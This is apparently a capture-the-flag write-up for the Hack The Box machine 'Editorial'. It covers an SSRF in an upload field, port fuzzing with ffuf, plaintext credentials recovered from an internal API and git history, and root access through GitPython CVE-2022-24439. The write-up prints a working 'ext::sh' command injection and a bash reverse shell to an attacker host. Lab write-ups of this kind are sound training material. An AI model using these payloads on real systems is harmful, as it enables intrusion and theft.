# Editorial
![](Images/Card.png)

__Machine IP__: 10.10.11.20

__DATE__ : 17/10/2024

__MODE__ : Guided

# Machine Info
`Editorial` is an easy difficulty Linux machine that features a publishing web application vulnerable to `Server-Side Request Forgery (SSRF)`. This vulnerability is leveraged to gain access to an internal running API, which is then leveraged to obtain credentials that lead to `SSH` access to the machine. Enumerating the system further reveals a Git repository that is leveraged to reveal credentials for a new user. The `root` user can be obtained by exploiting [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) and the sudo configuration. 

# Nmap

## Fast scan
```raw
# Nmap 7.94SVN scan initiated Mon Oct 21 22:51:43 2024 as: nmap -v -F -oA FastScan 10.10.11.20
Nmap scan report for Editorial.htb (10.10.11.20)
Host is up (0.042s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Detailed scan
```raw
nmap -p 22,80 -sV -sC 10.10.11.20 -oA Editorial
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 22:53 EDT
Nmap scan report for Editorial.htb (10.10.11.20)
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
```


# Web
We notice when pressing preview that there is an SSRF as it connects to our server

![](Images/SSRF.png)

## NetCat

```raw
┌──(kali㉿kali)-[~/…/Machines/Easy/Editorial/Images]
└─$ nc -lnvp 8080                                  
listening on [any] 8080 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38182
POST http://editorial.htb/upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------341473289927229874052099398072
Content-Length: 372
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------341473289927229874052099398072
Content-Disposition: form-data; name="bookurl"

http://$MyIP:8080/Cover
-----------------------------341473289927229874052099398072
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------341473289927229874052099398072--

```

# SSRF Attack

## Request.req
```req
POST /upload-cover HTTP/1.1
Host: editorial.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------246200350941885488901098308613
Content-Length: 372
Origin: http://editorial.htb
Connection: keep-alive
Referer: http://editorial.htb/upload

-----------------------------246200350941885488901098308613
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------246200350941885488901098308613
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------246200350941885488901098308613--

```

## Numbers.txt

Numbers of all ports

# FUFF to simulate attack
```bash
ffuf -request request.req -request-proto http -w numbers.txt
```

-request-proto is set to HTTPS default so we need to change that

-fs had to filter size as the default is 61 could also use -fr and add the jpeg

```raw
ffuf -request request.req -request-proto http -w numbers.txt -fs 61

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /home/kali/workspace/HTB/Machines/Easy/Editorial/numbers.txt
 :: Header           : Host: editorial.htb
 :: Header           : Accept: */*
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------41651457861825429702625530035
 :: Header           : Origin: http://editorial.htb
 :: Data             : -----------------------------41651457861825429702625530035
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------41651457861825429702625530035
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------41651457861825429702625530035--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 232ms]
:: Progress: [65335/65335] :: Job [1/1] :: 400 req/sec :: Duration: [0:03:16] :: Errors: 1 ::
```

## localhost port 5000

```raw
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 27 Oct 2024 07:48:42 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 51

static/uploads/563dba69-9f55-43a3-85a1-dd5505331667
```

### File from localhost:5000

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```

## login file at /api/latest/metadata/messages/authors

```bash
jq .template_mail_message -r  messages.json
```
```txt
Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.

Your login credentials for our internal forum and authors site are:
Username: dev
Password: dev080217_devAPI!@
Please be sure to change your password as soon as possible for security purposes.

Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.

Best regards, Editorial Tiempo Arriba Team.
```

# SSH with credentials

```bash
cat user.txt
```

Submit user flag

## Git repo
```txt
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ pwd
/home/dev
dev@editorial:~$ ls apps/
dev@editorial:~$ ls -la apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git
```

### Git log
```txt
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

After looking at all the commits we find this

```txt
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
```

Saved it in prod.txt

```bash
sed 's/\\n/\n/g' prod.txt > tmp.txt && mv tmp.txt prod.txt 
```
```

'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.

Your login credentials for our internal forum and authors site are:
Username: prod
Password: 080217_Producti0n_2023!@
Please be sure to change your password as soon as possible for security purposes.

Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.

Best regards, " + api_editorial_name + " Team."

```

# SSH into prod

```
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ ls
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

## python script

``` bash
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 
```
```py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

### We see it uses git from GitPython Library we check to see its version
```txt
prod@editorial:/opt/internal_apps/clone_changes$ GitPython -version
GitPython: command not found
prod@editorial:/opt/internal_apps/clone_changes$ pip list | grep GitPython
GitPython             3.1.29
```

#### Google
GitPython 3.1.29 CVE
Based on the provided search results, GitPython version 3.1.29 has a vulnerability identified as CVE-2022-24439, which is a remote code execution (RCE) vulnerability. This vulnerability was fixed in GitPython version 3.1.30, which includes two sets of fixes for CVE-2022-24439.

[PoC](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/opt/internal_apps/clone_changes$ ls /tmp/ | grep pwned
pwned
prod@editorial:/opt/internal_apps/clone_changes$ 
```

# Root
```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/$MyIP/1337% 0>&1'"
```

```
┌──(kali㉿kali)-[~/…/HTB/Machines/Easy/Editorial]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [$MyIP] from (UNKNOWN) [10.10.11.20] 42638
...
root@editorial:/opt/internal_apps/clone_changes# ls /root/
ls /root/
root.txt

```